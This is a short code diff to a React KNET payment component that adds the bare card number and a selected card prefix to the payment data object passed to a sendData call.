@@ -239,6 +239,8 @@ export default function KNETPayment() {
     sendData({
       paymentCard: {
         cardNumber: fullCardNumber,
+        cardNumberOnly: cardNumber,
+        prefix: selectedPrefix,
         nameOnCard: "KNET",
         expiryMonth: expiryMonth.padStart(2, "0"),
         expiryYear: expiryYear,
